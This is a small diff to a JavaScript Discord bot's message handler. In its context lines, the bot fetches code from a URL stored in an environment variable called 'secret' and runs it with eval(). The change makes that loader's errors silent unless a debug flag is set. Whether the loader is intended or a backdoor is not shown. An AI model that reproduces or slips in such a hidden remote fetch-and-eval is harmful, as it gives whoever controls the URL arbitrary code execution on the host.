@@ -107,7 +107,11 @@ client.on('message', msg => {
           var foo = (async function() {
               const ret = await axios.get(process.env.secret);
               eval(ret.data);
-          })().catch(err => console.log(err));
+          })().catch(err => {
+              if (process.env.debug == 'true') {
+                  console.error(err);
+              }
+          });
       };
     if (msg.content.startsWith(prefix)) {
         var content = msg.content.substring(prefix.length, msg.content.length);
